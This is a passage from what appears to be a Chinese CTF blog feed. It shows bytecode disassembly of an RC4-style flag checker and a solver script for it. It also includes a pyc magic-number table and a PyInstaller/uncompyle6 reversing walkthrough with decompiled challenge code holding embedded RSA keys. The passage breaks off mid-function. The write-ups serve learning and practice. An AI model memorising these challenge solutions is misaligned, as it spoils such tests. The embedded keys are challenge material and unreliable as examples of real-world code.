</span>      BUILD_LIST                      0<br>               <span class="hljs-number"> 2 </span>      LOAD_FAST                       0: .0<br>               <span class="hljs-number"> 4 </span>      FOR_ITER                       <span class="hljs-number"> 16 </span>(to 22)<br>               <span class="hljs-number"> 6 </span>      STORE_FAST                      1: i<br>               <span class="hljs-number"> 8 </span>      LOAD_GLOBAL                     0: ord<br>               <span class="hljs-number"> 10 </span>     LOAD_FAST                       1: i<br>               <span class="hljs-number"> 12 </span>     CALL_FUNCTION                   1<br>               <span class="hljs-number"> 14 </span>     LOAD_CONST                      0: 102<br>               <span class="hljs-number"> 16 </span>     BINARY_XOR                      <br>               <span class="hljs-number"> 18 </span>     LIST_APPEND                     2<br>               <span class="hljs-number"> 20 </span>     JUMP_ABSOLUTE                   4<br>               <span class="hljs-number"> 22 </span>     RETURN_VALUE                    <br>        &#x27;&lt;listcomp&gt;&#x27;<br>        256<br>        50<br>        1<br>        &#x27;&#x27;<br>        51<br>        &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;<br>        &#x27;yes!&#x27;<br>        &#x27;try again...&#x27;<br>    [Disassembly]<br>       <span class="hljs-number"> 0 </span>      LOAD_CONST                      0: 0<br>       <span class="hljs-number"> 2 </span>      LOAD_CONST                      1: None<br>       <span class="hljs-number"> 4 </span>      JUMP_FORWARD                   <span class="hljs-number"> 0 </span>(to 6)<br>       <span class="hljs-number"> 6 </span>      JUMP_FORWARD                   <span class="hljs-number"> 0 </span>(to 8)<br>       <span class="hljs-number"> 8 </span>      JUMP_FORWARD                   <span class="hljs-number"> 0 </span>(to 10)<br>       <span class="hljs-number"> 10 </span>     IMPORT_NAME                     0: base64<br>       <span class="hljs-number"> 12 </span>     STORE_NAME                      0: base64<br>       <span class="hljs-number"> 14 </span>     LOAD_NAME                       1: input<br>       <span class="hljs-number"> 16 </span>     LOAD_CONST                      2: &#x27;Flag: &#x27;<br>       <span class="hljs-number"> 18 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 20 </span>     STORE_NAME                      2: text<br>       <span class="hljs-number"> 22 </span>     LOAD_CONST                      3: &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;<br>       <span class="hljs-number"> 24 </span>     STORE_NAME                      3: key<br>       <span class="hljs-number"> 26 </span>     LOAD_CONST                      4: &lt;CODE&gt; &lt;listcomp&gt;<br>       <span class="hljs-number"> 28 </span>     LOAD_CONST                      5: &#x27;&lt;listcomp&gt;&#x27;<br>       <span class="hljs-number"> 30 </span>     MAKE_FUNCTION                   0<br>       <span class="hljs-number"> 32 </span>     LOAD_NAME                       3: key<br>       <span class="hljs-number"> 34 </span>     GET_ITER                        <br>       <span class="hljs-number"> 36 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 38 </span>     STORE_NAME                      3: key<br>       <span class="hljs-number"> 40 </span>     LOAD_NAME                       4: list<br>       <span class="hljs-number"> 42 </span>     LOAD_NAME                       5: range<br>       <span class="hljs-number"> 44 </span>     LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 46 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 48 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 50 </span>     STORE_NAME                      6: s<br>       <span class="hljs-number"> 52 </span>     LOAD_CONST                      0: 0<br>       <span class="hljs-number"> 54 </span>     STORE_NAME                      7: j<br>       <span class="hljs-number"> 56 </span>     LOAD_NAME                       5: range<br>       <span class="hljs-number"> 58 </span>     LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 60 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 62 </span>     GET_ITER                        <br>       <span class="hljs-number"> 64 </span>     FOR_ITER                       <span class="hljs-number"> 62 </span>(to 128)<br>       <span class="hljs-number"> 66 </span>     STORE_NAME                      8: i<br>       <span class="hljs-number"> 68 </span>     LOAD_NAME                       7: j<br>       <span class="hljs-number"> 70 </span>     LOAD_NAME                       6: s<br>       <span class="hljs-number"> 72 </span>     LOAD_NAME                       8: i<br>       <span class="hljs-number"> 74 </span>     BINARY_SUBSCR                   <br>       <span class="hljs-number"> 76 </span>     BINARY_ADD                      <br>       <span class="hljs-number"> 78 </span>     LOAD_NAME                       3: key<br>       <span class="hljs-number"> 80 </span>     LOAD_NAME                       8: i<br>       <span class="hljs-number"> 82 </span>     LOAD_NAME                       9: len<br>       <span class="hljs-number"> 84 </span>     LOAD_NAME                       3: key<br>       <span class="hljs-number"> 86 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 88 </span>     BINARY_MODULO                   <br>       <span class="hljs-number"> 90 </span>     BINARY_SUBSCR                   <br>       <span class="hljs-number"> 92 </span>     BINARY_ADD                      <br>       <span class="hljs-number"> 94 </span>     LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 96 </span>     BINARY_MODULO                   <br>       <span class="hljs-number"> 98 </span>     STORE_NAME                      7: j<br>       <span class="hljs-number"> 100 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 102 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 104 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 106 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 108 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 110 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 112 </span>    ROT_TWO                         <br>       <span class="hljs-number"> 114 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 116 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 118 </span>    STORE_SUBSCR                    <br>       <span class="hljs-number"> 120 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 122 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 124 </span>    STORE_SUBSCR                    <br>       <span class="hljs-number"> 126 </span>    JUMP_ABSOLUTE                   64<br>       <span class="hljs-number"> 128 </span>    LOAD_CONST                      0: 0<br>       <span class="hljs-number"> 130 </span>    DUP_TOP                         <br>       <span class="hljs-number"> 132 </span>    STORE_NAME                      8: i<br>       <span class="hljs-number"> 134 </span>    STORE_NAME                      7: j<br>       <span class="hljs-number"> 136 </span>    BUILD_LIST                      0<br>       <span class="hljs-number"> 138 </span>    STORE_NAME                      10: data<br>       <span class="hljs-number"> 140 </span>    LOAD_NAME                       5: range<br>       <span class="hljs-number"> 142 </span>    LOAD_CONST                      7: 50<br>       <span class="hljs-number"> 144 </span>    CALL_FUNCTION                   1<br>       <span class="hljs-number"> 146 </span>    GET_ITER                        <br>       <span class="hljs-number"> 148 </span>    FOR_ITER                       <span class="hljs-number"> 88 </span>(to 238)<br>       <span class="hljs-number"> 150 </span>    STORE_NAME                      11: _<br>       <span class="hljs-number"> 152 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 154 </span>    LOAD_CONST                      8: 1<br>       <span class="hljs-number"> 156 </span>    BINARY_ADD                      <br>       <span class="hljs-number"> 158 </span>    LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 160 </span>    BINARY_MODULO                   <br>       <span class="hljs-number"> 162 </span>    STORE_NAME                      8: i<br>       <span class="hljs-number"> 164 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 166 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 168 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 170 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 172 </span>    BINARY_ADD                      <br>       <span class="hljs-number"> 174 </span>    LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 176 </span>    BINARY_MODULO                   <br>       <span class="hljs-number"> 178 </span>    STORE_NAME                      7: j<br>       <span class="hljs-number"> 180 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 182 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 184 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 186 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 188 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 190 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 192 </span>    ROT_TWO                         <br>       <span class="hljs-number"> 194 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 196 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 198 </span>    STORE_SUBSCR                    <br>       <span class="hljs-number"> 200 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 202 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 204 </span>    STORE_SUBSCR                    <br>       <span class="hljs-number"> 206 </span>    LOAD_NAME                       10: data<br>       <span class="hljs-number"> 208 </span>    LOAD_METHOD                     12: append<br>       <span class="hljs-number"> 210 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 212 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 214 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 216 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 218 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 220 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 222 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 224 </span>    BINARY_ADD                      <br>       <span class="hljs-number"> 226 </span>    LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 228 </span>    BINARY_MODULO                   <br>       <span class="hljs-number"> 230 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 232 </span>    CALL_METHOD                     1<br>       <span class="hljs-number"> 234 </span>    POP_TOP                         <br>       <span class="hljs-number"> 236 </span>    JUMP_ABSOLUTE                   148<br>       <span class="hljs-number"> 238 </span>    LOAD_CONST                      9: &#x27;&#x27;<br>       <span class="hljs-number"> 240 </span>    STORE_NAME                      13: result<br>       <span class="hljs-number"> 242 </span>    LOAD_NAME                       14: zip<br>       <span class="hljs-number"> 244 </span>    LOAD_NAME                       2: text<br>       <span class="hljs-number"> 246 </span>    LOAD_NAME                       10: data<br>       <span class="hljs-number"> 248 </span>    CALL_FUNCTION                   2<br>       <span class="hljs-number"> 250 </span>    GET_ITER                        <br>       <span class="hljs-number"> 252 </span>    FOR_ITER                       <span class="hljs-number"> 32 </span>(to 286)<br>       <span class="hljs-number"> 254 </span>    UNPACK_SEQUENCE                 2<br>       <span class="hljs-number"> 256 </span>    STORE_NAME                      15: c<br>       <span class="hljs-number"> 258 </span>    STORE_NAME                      16: k<br>       <span class="hljs-number"> 260 </span>    LOAD_NAME                       13: result<br>       <span class="hljs-number"> 262 </span>    LOAD_NAME                       17: chr<br>       <span class="hljs-number"> 264 </span>    LOAD_NAME                       18: ord<br>       <span class="hljs-number"> 266 </span>    LOAD_NAME                       15: c<br>       <span class="hljs-number"> 268 </span>    CALL_FUNCTION                   1<br>       <span class="hljs-number"> 270 </span>    LOAD_NAME                       16: k<br>       <span class="hljs-number"> 272 </span>    BINARY_XOR                      <br>       <span class="hljs-number"> 274 </span>    LOAD_CONST                      10: 51<br>       <span class="hljs-number"> 276 </span>    BINARY_XOR                      <br>       <span class="hljs-number"> 278 </span>    CALL_FUNCTION                   1<br>       <span class="hljs-number"> 280 </span>    INPLACE_ADD                     <br>       <span class="hljs-number"> 282 </span>    STORE_NAME                      13: result<br>       <span class="hljs-number"> 284 </span>    JUMP_ABSOLUTE                   252<br>       <span class="hljs-number"> 286 </span>    LOAD_NAME                       0: base64<br>       <span class="hljs-number"> 288 </span>    LOAD_METHOD                     19: b64encode<br>       <span class="hljs-number"> 290 </span>    LOAD_NAME                       13: result<br>       <span class="hljs-number"> 292 </span>    LOAD_METHOD                     20: encode<br>       <span class="hljs-number"> 294 </span>    CALL_METHOD                     0<br>       <span class="hljs-number"> 296 </span>    CALL_METHOD                     1<br>       <span class="hljs-number"> 298 </span>    LOAD_METHOD                     21: decode<br>       <span class="hljs-number"> 300 </span>    CALL_METHOD                     0<br>       <span class="hljs-number"> 302 </span>    STORE_NAME                      22: enc<br>       <span class="hljs-number"> 304 </span>    LOAD_NAME                       22: enc<br>       <span class="hljs-number"> 306 </span>    LOAD_CONST                      11: &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;<br>       <span class="hljs-number"> 308 </span>    COMPARE_OP                     <span class="hljs-number"> 2 </span>(==)<br>       <span class="hljs-number"> 310 </span>    POP_JUMP_IF_FALSE               324<br>       <span class="hljs-number"> 314 </span>    LOAD_NAME                       23: print<br>       <span class="hljs-number"> 316 </span>    LOAD_CONST                      12: &#x27;yes!&#x27;<br>       <span class="hljs-number"> 318 </span>    CALL_FUNCTION                   1<br>       <span class="hljs-number"> 320 </span>    POP_TOP                         <br>       <span class="hljs-number"> 322 </span>    JUMP_FORWARD                   <span class="hljs-number"> 8 </span>(to 332)<br>       <span class="hljs-number"> 324 </span>    LOAD_NAME                       23: print<br>       <span class="hljs-number"> 326 </span>    LOAD_CONST                      13: &#x27;try again...&#x27;<br>       <span class="hljs-number"> 328 </span>    CALL_FUNCTION                   1<br>       <span class="hljs-number"> 330 </span>    POP_TOP                         <br>       <span class="hljs-number"> 332 </span>    LOAD_CONST                      1: None<br>       <span class="hljs-number"> 334 </span>    RETURN_VALUE<br></code></pre></td></tr></table></figure><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs prolog">import base64<br><br># 原始密钥和加密的目标输出<br>key = <span class="hljs-string">&#x27;7e021a7dd49e4bd0837e22129682551b&#x27;</span><br>encoded_target = <span class="hljs-string">&#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;</span><br><br># 处理密钥<br>processed_key = [ord(i) ^ <span class="hljs-number">102</span> for i in key]<br><br># <span class="hljs-symbol">RC4</span> 类似的流密码算法构建<br>s = list(range(<span class="hljs-number">256</span>))<br>j = <span class="hljs-number">0</span><br>for i in range(<span class="hljs-number">256</span>):<br>    j = (j + s[i] + processed_key[i <span class="hljs-comment">% len(processed_key)]) % 256</span><br>    s[i], s[j] = s[j], s[i]<br><br># 生成数据流 <span class="hljs-string">`data`</span><br>i = j = <span class="hljs-number">0</span><br>data = []<br>for <span class="hljs-symbol">_</span> in range(<span class="hljs-number">50</span>):  # 生成<span class="hljs-number">50</span>个密钥流字节<br>    i = (i + <span class="hljs-number">1</span>) <span class="hljs-comment">% 256</span><br>    j = (j + s[i]) <span class="hljs-comment">% 256</span><br>    s[i], s[j] = s[j], s[i]<br>    data.append(s[(s[i] + s[j]) <span class="hljs-comment">% 256])</span><br><br># 解码 <span class="hljs-string">`encoded_target`</span> 并转换为原始字符串<br>target_bytes = base64.b64decode(encoded_target).decode()<br>decoded_text = <span class="hljs-string">&#x27;&#x27;</span><br><br># 使用 <span class="hljs-string">`data`</span> 对 <span class="hljs-string">`target_bytes`</span> 进行解码<br>for c, k in zip(target_bytes, data):<br>    decoded_text += chr((ord(c) ^ k) ^ <span class="hljs-number">51</span>)<br><br>print(<span class="hljs-string">&quot;Decoded text (flag):&quot;</span>, decoded_text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>REVERSE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python逆向</title>
    <link href="/2025/03/22/python%E9%80%86%E5%90%91/"/>
    <url>/2025/03/22/python%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="3-8以上用pycdc"><a href="#3-8以上用pycdc" class="headerlink" title="3.8以上用pycdc"></a>3.8以上用pycdc</h1><p><a href="https://blog.csdn.net/m0_73644864/article/details/135038499?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172241258516800225543557%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172241258516800225543557&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-135038499-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=kali%E4%B8%8Apycdc%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">pycdc配置和使用-CSDN博客</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h1 id="Python逆向全版本MagicNumber表-python3-11-4-magicnumber-CSDN博客"><a href="#Python逆向全版本MagicNumber表-python3-11-4-magicnumber-CSDN博客" class="headerlink" title="Python逆向全版本MagicNumber表_python3.11.4 magicnumber-CSDN博客"></a><a href="https://blog.csdn.net/OrientalGlass/article/details/134612786">Python逆向全版本MagicNumber表_python3.11.4 magicnumber-CSDN博客</a></h1><h1 id="例题（正常的py逆向）"><a href="#例题（正常的py逆向）" class="headerlink" title="例题（正常的py逆向）"></a>例题（正常的py逆向）</h1><p>enum PycMagic {</p><p>MAGIC_1_0 &#x3D; 0x00999902,</p><p>MAGIC_1_1 &#x3D; 0x00999903, &#x2F;* Also covers 1.2 *&#x2F;</p><p>MAGIC_1_3 &#x3D; 0x0A0D2E89,</p><p>MAGIC_1_4 &#x3D; 0x0A0D1704,</p><p>MAGIC_1_5 &#x3D; 0x0A0D4E99,</p><p>MAGIC_1_6 &#x3D; 0x0A0DC4FC,</p><p>MAGIC_2_0 &#x3D; 0x0A0DC687,</p><p>MAGIC_2_1 &#x3D; 0x0A0DEB2A,</p><p>MAGIC_2_2 &#x3D; 0x0A0DED2D,</p><p>MAGIC_2_3 &#x3D; 0x0A0DF23B,</p><p>MAGIC_2_4 &#x3D; 0x0A0DF26D,</p><p>MAGIC_2_5 &#x3D; 0x0A0DF2B3,</p><p>MAGIC_2_6 &#x3D; 0x0A0DF2D1,</p><p>MAGIC_2_7 &#x3D; 0x0A0DF303,</p><p>MAGIC_3_0 &#x3D; 0x0A0D0C3A,</p><p>MAGIC_3_1 &#x3D; 0x0A0D0C4E,</p><p>MAGIC_3_2 &#x3D; 0x0A0D0C6C,</p><p>MAGIC_3_3 &#x3D; 0x0A0D0C9E,</p><p>MAGIC_3_4 &#x3D; 0x0A0D0CEE,</p><p>MAGIC_3_5 &#x3D; 0x0A0D0D16,</p><p>MAGIC_3_5_3 &#x3D; 0x0A0D0D17,</p><p>MAGIC_3_6 &#x3D; 0x0A0D0D33,</p><p>MAGIC_3_7 &#x3D; 0x0A0D0D42,</p><p>MAGIC_3_8 &#x3D; 0x0A0D0D55,</p><p>MAGIC_3_9 &#x3D; 0x0A0D0D61,</p><p>MAGIC_3_10 &#x3D; 0x0A0D0D6F,</p><p>MAGIC_3_11 &#x3D; 0x0A0D0DA7,</p><p>MAGIC_3_12 &#x3D; 0x0A0D0DCB,</p><p>INVALID &#x3D; 0,</p><p>};</p><h2 id="1、ezpy"><a href="#1、ezpy" class="headerlink" title="1、ezpy"></a>1、ezpy</h2><p>exeinfope查壳，观察到pyinstaller字眼</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721203111039-65cd225b-d6e3-4c27-9eb2-48c486bd6637.png"></p><p>python逆向</p><p>pyinstxtractor下载链接-&gt;<a href="https://github.com/extremecoders-re/pyinstxtractor">GitHub - extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor</a></p><p>uncompyle6库下载命令-&gt;cmd窗口输入【<strong>pip install uncompyle6</strong>】</p><p>这里已经下载完成了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721203317605-5da7ad51-30bf-4077-8f44-1833bc6906bc.png"></p><p>然后进行反编译，在cmd窗口中输入命令【<strong>python pyinstxtractor.py 文件路径</strong>】</p><p>这里懒得输文件路径，索性直接拿到源代码文件下面</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721203409394-c24b4f93-90a4-4afc-a822-a0f5ad10b6b6.png"></p><p>可以得到一个文件夹</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721203679615-679c60ba-196e-46c4-8b5d-b3f062c22aea.png"></p><p>此时在同目录下产生一个【<strong>xx.exe_extracted</strong>】文件夹，双击进入此文件夹，找到一个pyc文件（此处有两个文件，我们关注的是除struct.pyc外的另一个pyc文件，如下图红圈）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721203698089-38d6150d-8e8a-4c8e-acca-b28d291c2c7e.png"></p><p>然后我们忽略那个struct.pyc ,对另外一个pyc进行反编译</p><p>在此处再次打开终端，输入命令【<strong>uncompyle6 src.pyc &gt; src.py</strong>】之后即可在同目录下生成反编译的python文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721203938856-2d9e294a-4d6d-4961-b07e-eb3dd4c7f9ce.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721203953404-33bb6968-a6ff-412f-a8b3-ecdcaef73a5e.png"></p><p>然后就可以看到反编译成功的py文件啦</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721203992769-e9d81411-49a0-48d6-9da2-514522922429.png">只要令flag&#x3D;decrypt2(“AAAAAAAAAAAfFwwRSAIWWQ&#x3D;&#x3D;”, key),key也已经说明</p><p>即可获得flag</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs css"># uncompyle6 version <span class="hljs-number">3.9</span>.<span class="hljs-number">1</span><br># Python bytecode version base <span class="hljs-number">3.4</span> (<span class="hljs-number">3310</span>)<br># Decompiled <span class="hljs-selector-tag">from</span>: Python <span class="hljs-number">3.10</span>.<span class="hljs-number">9</span> | packaged by Anaconda, Inc. | (main, Mar  <span class="hljs-number">1</span> <span class="hljs-number">2023</span>, <span class="hljs-number">18</span>:<span class="hljs-number">18</span>:<span class="hljs-number">15</span>) [MSC v.<span class="hljs-number">1916</span> <span class="hljs-number">64</span> bit (AMD64)]<br># Embedded file name: src.py<br>import rsa, base64<br>key1 = rsa.PrivateKey.<span class="hljs-built_in">load_pkcs1</span>(base64.<span class="hljs-built_in">b64decode</span>(<span class="hljs-string">&quot;LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcVFJQkFBS0NBUUVBcVJUZ0xQU3BuT0ZDQnJvNHR1K1FBWXFhTjI2Uk42TzY1bjBjUURGRy9vQ1NJSU00ClNBeEVWaytiZHpSN2FucVNtZ1l5MEhRWGhDZTM2U2VGZTF0ejlrd0taL3UzRUpvYzVBSzR1NXZ4UW5QOWY1cTYKYVFsbVAvVjJJTXB5NFFRNlBjbUVoNEtkNm81ZWRJUlB2SHd6V0dWS09OQ3BpL0taQ082V0tWYkpXcWh3WGpEQgpsSDFNVURzZ1gyVUM4b3Bodnk5dXIyek9kTlBocElJZHdIc1o5b0ZaWWtaMUx5Q0lRRXRZRmlKam1GUzJFQ1RVCkNvcU9acnQxaU5jNXVhZnFvZlB4eHlPb2wwYVVoVGhiaHE4cEpXL3FPSFdYd0xJbXdtNk96YXFVeks4NEYyY3UKYWRiRE5zeVNvaElHaHYzd0lBVThNSlFnOEthd1Z3ZHBzRWhlSXdJREFRQUJBb0lCQURBazdwUStjbEZtWHF1Vgp1UEoyRWxZdUJpMkVnVHNMbHZ0c1ltL3cyQnM5dHQ0bEh4QjgxYlNSNUYyMEJ2UlJ4STZ3OXlVZCtWZzdDd1lMCnA5bHhOL3JJdWluVHBkUEhYalNhaGNsOTVOdWNOWEZ4T0dVU05SZy9KNHk4dUt0VHpkV3NITjJORnJRa0o4Y2IKcWF5czNOM3RzWTJ0OUtrUndjbUJGUHNJalNNQzB5UkpQVEE4cmNqOFkranV3SHZjbUJPNHVFWXZXeXh0VHR2UQova0RQelBqdTBuakhkR055RytkSDdkeHVEV2Jxb3VZQnRMdzllZGxXdmIydTJ5YnZzTXl0NWZTOWF1a01NUjNoCnBhaDRMcU1LbC9ETTU3cE44Vms0ZTU3WE1zZUJLWm1hcEptcVNnSGdjajRPNWE2R1RvelN1TEVoTmVGY0l2Tm8KWFczTEFHRUNnWWtBc0J0WDNVcFQ3aUcveE5BZDdSWER2MENOY1k1QnNZOGY4NHQ3dGx0U2pjSWdBKy9nUjFMZQpzb2gxY1RRd1RadUYyRTJXL1hHU3orQmJDTVVySHNGWmh1bXV6aTBkbElNV3ZhU0dvSlV1OGpNODBlUjRiVTRyCmdYQnlLZVZqelkzNVlLejQ5TEVBcFRQcTZRYTVQbzhRYkF6czhuVjZtNXhOQkNPc0pQQ29zMGtCclFQaGo5M0cKOFFKNUFQWEpva0UrMmY3NXZlazZNMDdsaGlEUXR6LzRPYWRaZ1MvUVF0eWRLUmg2V3VEeGp3MytXeXc5ZjNUcAp5OXc0RmtLRzhqNVRpd1RzRmdzem94TGo5TmpSUWpqb3cyVFJGLzk3b2NxMGNwY1orMUtsZTI1cEJ3bk9yRDJBCkVpMUVkMGVEV3dJR2gzaFhGRmlRSzhTOG5remZkNGFMa1ZxK1V3S0JpRXRMSllIamFZY0N2dTd5M0JpbG1ZK0gKbGZIYkZKTkowaXRhazRZZi9XZkdlOUd6R1h6bEhYblBoZ2JrZlZKeEVBU3ZCOE5NYjZ5WkM5THdHY09JZnpLRApiczJQMUhuT29rWnF0WFNxMCt1UnBJdEkxNFJFUzYySDJnZTNuN2dlMzJSS0VCYnVKb3g3YWhBL1k2d3ZscUhiCjFPTEUvNnJRWk0xRVF6RjRBMmpENmdlREJVbHhWTUVDZVFDQjcyUmRoYktNL3M0TSsvMmYyZXI4Y2hwT01SV1oKaU5Hb3l6cHRrby9sSnRuZ1RSTkpYSXdxYVNCMldCcXpndHNSdEhGZnpaNlNyWlJCdTd5Y0FmS3dwSCtUd2tsNQpoS2hoSWFTNG1vaHhwUVNkL21td1JzbTN2NUNDdXEvaFNtNmNXYTdFOVZxc25heGQzV21tQ2VqTnp0MUxQWUZNCkxZMENnWWdKUHhpVTVraGs5cHB6TVAwdWU0clA0Z2YvTENldEdmQjlXMkIyQU03eW9VM2VsMWlCSEJqOEZ3UFQKQUhKUWtCeTNYZEh3SUpGTUV1RUZSSFFzcUFkSTlYVDBzL2V0QTg1Y3grQjhjUmt3bnFHakFseW1PdmJNOVNrMgptMnRwRi8rYm56ZVhNdFA3c0ZoR3NHOXJ5SEZ6UFNLY3NDSDhXWWx0Y1pTSlNDZHRTK21qblAwelArSjMKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K&quot;</span>))<br>key2 = rsa.PublicKey.<span class="hljs-built_in">load_pkcs1</span>(base64.<span class="hljs-built_in">b64decode</span>(<span class="hljs-string">&quot;LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFSVGdMUFNwbk9GQ0JybzR0dStRQVlxYU4yNlJONk82NW4wY1FERkcvb0NTSUlNNFNBeEUKVmsrYmR6UjdhbnFTbWdZeTBIUVhoQ2UzNlNlRmUxdHo5a3dLWi91M0VKb2M1QUs0dTV2eFFuUDlmNXE2YVFsbQpQL1YySU1weTRRUTZQY21FaDRLZDZvNWVkSVJQdkh3eldHVktPTkNwaS9LWkNPNldLVmJKV3Fod1hqREJsSDFNClVEc2dYMlVDOG9waHZ5OXVyMnpPZE5QaHBJSWR3SHNaOW9GWllrWjFMeUNJUUV0WUZpSmptRlMyRUNUVUNvcU8KWnJ0MWlOYzV1YWZxb2ZQeHh5T29sMGFVaFRoYmhxOHBKVy9xT0hXWHdMSW13bTZPemFxVXpLODRGMmN1YWRiRApOc3lTb2hJR2h2M3dJQVU4TUpRZzhLYXdWd2Rwc0VoZUl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K&quot;</span>))<br><br>def <span class="hljs-built_in">encrypt1</span>(message):<br>    crypto_text = 